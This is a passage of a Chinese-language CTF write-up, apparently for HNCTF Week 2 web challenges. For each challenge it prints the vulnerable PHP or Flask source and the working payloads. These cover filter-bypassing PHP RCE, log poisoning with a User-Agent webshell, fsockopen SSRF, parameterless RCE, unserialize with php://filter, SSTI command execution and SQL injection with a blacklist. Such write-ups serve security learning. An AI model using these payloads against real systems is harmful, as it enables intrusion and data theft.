avrasm"><span class="hljs-symbol">hint:</span>灵感来源于ctfshow吃瓜杯Y4大佬的题<br></code></pre></td></tr></table></figure><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;rce&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$rce</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;rce&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$rce</span>) &lt;= <span class="hljs-number">130</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$rce</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="hljs-variable">$rce</span>)) &#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$rce</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;Are you hack me?&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I want string!&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;too long!&quot;</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>自增rce，网上的帖子很多，大多都是转载P神的。</p><p>没啥新东西，挺狗的（bushi），就是死命压缩代码量。</p><p>思路就是拼接出chr，用chr直接构造字符，其实一开始思路就对了，但是代码那会儿才压缩到一百五，还以为思路错了。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=[]._;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>[<span class="hljs-number">1</span>];<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-number">0</span>];<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_1</span>=++<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_1</span>.++<span class="hljs-variable">$_</span>.<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=_.<span class="hljs-variable">$_</span>(<span class="hljs-number">71</span>).<span class="hljs-variable">$_</span>(<span class="hljs-number">69</span>).<span class="hljs-variable">$_</span>(<span class="hljs-number">84</span>);(<span class="hljs-variable">$$_</span>&#123;<span class="hljs-number">1</span>&#125;)(<span class="hljs-variable">$$_</span>&#123;<span class="hljs-number">2</span>&#125;);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200208.png" alt="image-20221010201512706"></p><p>正好一百二，极限。</p><h2 id="WEEK2-easy-include"><a href="#WEEK2-easy-include" class="headerlink" title="[WEEK2]easy_include"></a>[WEEK2]easy_include</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//WEB手要懂得搜索</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=/i&quot;</span>, <span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>php都过滤了，用日志包含，nginx的服务器</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200110.png" alt="image-20221010202430002"></p><p>在UA头写马就行了</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102201548.png" alt="image-20221010203000668"></p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200499.png" alt="image-20221010203009821"></p><h2 id="WEEK2-ez-ssrf"><a href="#WEEK2-ez-ssrf" class="headerlink" title="[WEEK2]ez_ssrf"></a>[WEEK2]ez_ssrf</h2><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-variable">$port</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;port&#x27;</span>];<br><br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>,<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>),<span class="hljs-variable">$error</span>,<span class="hljs-variable">$errstr</span>,<span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fp</span>) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$data</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-number">128</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">🥰localhost plz🥰<br></code></pre></td></tr></table></figure><p>一开始没打过这种fsockopen()的SSRF，以为fwrite可以用来直接写webshell   &lt;(￣3￣)&gt; </p><p>但是其实是向打开的连接通道发送信息的（不是直接向主机发送）</p><p>因此可以构造</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flag.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> HOST:<span class="hljs-number">127.0.0.1</span> Connection:Close<br></code></pre></td></tr></table></figure><p>我是用代码拼接的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$out</span>  = <span class="hljs-string">&quot;GET /flag.php HTTP/1.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;HOST:127.0.0.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection:Close\r\n\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$out</span>);<br></code></pre></td></tr></table></figure><p>因为\r\n这样的换行符直接用编码工具不管用</p><p>这是失败的payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">R<span class="hljs-number">0</span>VUIC<span class="hljs-number">9</span>mbGF<span class="hljs-symbol">nLnBocCBIVFRQLzEuMSBIT1</span><span class="hljs-symbol">NUOjEyNy4</span>wLjAuMSBDb<span class="hljs-number">25</span>uZW<span class="hljs-symbol">N0</span>aW<span class="hljs-number">9</span>uOk<span class="hljs-symbol">Nsb3</span><span class="hljs-symbol">Nl</span><br></code></pre></td></tr></table></figure><p>成功payload</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">R<span class="hljs-number">0</span>VUIC<span class="hljs-number">9</span>mbGF<span class="hljs-symbol">nLnBocCBIVFRQLzEuMQ0</span>KSE<span class="hljs-number">9</span>TVDoxMjcuMC<span class="hljs-number">4</span>wLjE<span class="hljs-symbol">NCkNvbm5</span>lY<span class="hljs-number">3</span>Rpb<span class="hljs-number">246</span>Q<span class="hljs-number">2</span>x<span class="hljs-attr">vc2</span>U<span class="hljs-symbol">NCg0</span>KDQo=<br></code></pre></td></tr></table></figure><p>完整payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?host=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>&amp;port=<span class="hljs-number">80</span>&amp;data=R<span class="hljs-number">0</span>VUIC<span class="hljs-number">9</span>mbGF<span class="hljs-symbol">nLnBocCBIVFRQLzEuMQ0</span>KSE<span class="hljs-number">9</span>TVDoxMjcuMC<span class="hljs-number">4</span>wLjE<span class="hljs-symbol">NCkNvbm5</span>lY<span class="hljs-number">3</span>Rpb<span class="hljs-number">246</span>Q<span class="hljs-number">2</span>x<span class="hljs-attr">vc2</span>U<span class="hljs-symbol">NCg0</span>KDQo=<br></code></pre></td></tr></table></figure><p>等待时间比较久，是正常现象。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200269.png" alt="image-20221005234117645"></p><h2 id="WEEK2-Canyource"><a href="#WEEK2-Canyource" class="headerlink" title="[WEEK2]Canyource"></a>[WEEK2]Canyource</h2><p>经典无参数RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])&amp;&amp;!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/url|show|high|na|info|dec|oct|pi|log|data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;    <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;please input code&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>获取当前目录文件名</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?code=print<span class="hljs-constructor">_r(<span class="hljs-params">scandir</span>(<span class="hljs-params">pos</span>(<span class="hljs-params">localeconv</span>()</span>)));<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200862.png" alt="image-20221005234610920"></p><p>读取flag</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?code=readfile(next(<span class="hljs-built_in">array</span><span class="hljs-constructor">_reverse(<span class="hljs-params">scandir</span>(<span class="hljs-params">getcwd</span>()</span>))));<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200221.png" alt="image-20221005235138147"></p><h2 id="WEEK2-easy-unser"><a href="#WEEK2-easy-unser" class="headerlink" title="[WEEK2]easy_unser"></a>[WEEK2]easy_unser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;f14g.php&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">body</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$want</span>,<span class="hljs-variable">$todonothing</span> = <span class="hljs-string">&quot;i can&#x27;t get you want,But you can tell me before I wake up and change my mind&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$want</span></span>)</span>&#123;<br>        <span class="hljs-variable">$About_me</span> = <span class="hljs-string">&quot;When the object is created,I will be called&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$want</span> !== <span class="hljs-string">&quot; &quot;</span>) <span class="hljs-variable language_">$this</span>-&gt;want = <span class="hljs-variable">$want</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;want = <span class="hljs-variable language_">$this</span>-&gt;todonothing;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$About_me</span> = <span class="hljs-string">&quot;When the object is unserialized,I will be called&quot;</span>;<br>        <span class="hljs-variable">$but</span> = <span class="hljs-string">&quot;I can CHANGE you&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt; want = <span class="hljs-variable">$but</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;C1ybaby!&quot;</span>;<br>        <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$About_me</span> = <span class="hljs-string">&quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;So,let me see if you can get what you want\n&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;todonothing === <span class="hljs-variable language_">$this</span>-&gt;want)<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;鲍勃,别傻愣着!\n&quot;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;want == <span class="hljs-string">&quot;I can CHANGE you&quot;</span>)<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You are not you....&quot;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;want == <span class="hljs-string">&quot;f14g.php&quot;</span> OR <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$this</span>-&gt;want))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You want my heart?No way!\n&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You got it!&quot;</span>;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;want);<br>            &#125;<br>    &#125;<br>&#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">unserializeorder</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$CORE</span> = <span class="hljs-string">&quot;人类最大的敌人,就是无序. Yahi param vaastavikta hai!&lt;BR&gt;&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$About_me</span> = <span class="hljs-string">&quot;When the object is serialized,I will be called&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$About_me</span> = <span class="hljs-string">&quot;When the object is used as a string,I will be called&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;CORE;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">unserializeorder</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br>    <br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ywant&#x27;</span>]))<br>    &#123;<br>        <span class="hljs-variable">$ywant</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ywant&#x27;</span>]);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ywant</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>就两个类 body 和unserializeorder</p><p>明显是用作入门，unserializeorder没有用，不是pop链。</p><p>需要绕过wakeup，hightlight_file可以触发伪协议，使用伪协议读取flag</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">body</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$want</span>=<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=f14g.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$want</span></span>)</span>&#123;<br>        <span class="hljs-variable">$About_me</span> = <span class="hljs-string">&quot;When the object is created,I will be called&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$want</span> !== <span class="hljs-string">&quot; &quot;</span>) <span class="hljs-variable language_">$this</span>-&gt;want = <span class="hljs-variable">$want</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;want = <span class="hljs-variable language_">$this</span>-&gt;todonothing;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">body</span>(<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=f14g.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>));<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200466.png" alt="image-20221006001515137"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">PD9waHAKJGZsYWcgPSAiTlNTQ1RGe2JjYzFiNGYwLTJjYmItNDEyYy04YzUyLWVlODQwMGZiZDk0Nn0iOwo/Pg==<br><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;NSSCTF&#123;bcc1b4f0-2cbb-412c-8c52-ee8400fbd946&#125;&quot;</span>; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="WEEK2-ez-SSTI"><a href="#WEEK2-ez-SSTI" class="headerlink" title="[WEEK2]ez_SSTI"></a>[WEEK2]ez_SSTI</h2><p>无过滤SSTI直接打</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200481.png" alt="image-20221005235628951"></p><h2 id="WEEK2-easy-sql"><a href="#WEEK2-easy-sql" class="headerlink" title="[WEEK2]easy_sql"></a>[WEEK2]easy_sql</h2><p>三种回显</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">Here <span class="hljs-keyword">is</span> your want!<br>I <span class="hljs-keyword">am</span> <span class="hljs-keyword">so</span> handsome <br><br>姓名不存在，或账号密码错误<br><br>error<br></code></pre></td></tr></table></figure><p>error应该是黑名单检测。</p><p>万能密码成功执行，闭合完成</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">id</span>=<span class="hljs-number">11</span><span class="hljs-string">&#x27;/**/or&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>先打个fuzz</p><p>过滤列表：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PayloadLength<br>~<span class="hljs-number">525</span><br>!<span class="hljs-number">525</span><br>@<span class="hljs-number">525</span><br>#<span class="hljs-number">525</span><br>$<span class="hljs-number">525</span><br>%<span class="hljs-number">525</span><br>^<span class="hljs-number">525</span><br>&amp;<span class="hljs-number">525</span><br>-<span class="hljs-number">525</span><br>+<span class="hljs-number">525</span><br> <span class="hljs-number">525</span><br><span class="hljs-comment">--525</span><br><span class="hljs-comment">--+525</span><br>&amp;&amp;<span class="hljs-number">525</span><br>!(&lt;&gt;)<span class="hljs-number">525</span><br><span class="hljs-keyword">and</span><span class="hljs-number">525</span><br><span class="hljs-keyword">not</span><span class="hljs-number">525</span><br>sleep<span class="hljs-number">525</span><br><span class="hljs-keyword">order</span><span class="hljs-number">525</span><br><span class="hljs-keyword">is</span><span class="hljs-number">525</span><br><span class="hljs-keyword">distinct</span><span class="hljs-number">525</span><br>information<span class="hljs-number">525</span><br><span class="hljs-keyword">handler</span><span class="hljs-number">525</span><br>extractvalue<span class="hljs-number">525</span><br>pg_sleep<span class="hljs-number">525</span><br></code></pre></td></tr></table></figure><p>可以联合查询也可以布尔盲注</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">id=<span class="hljs-number">0</span>&#x27;<span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span>&#x27;<br><br>id=<span class="hljs-number">0</span>&#x27;<span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210102200496.png" alt="image-20221006155546990"></p><p>这里是前期的测试</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">id=0&#x27;<span 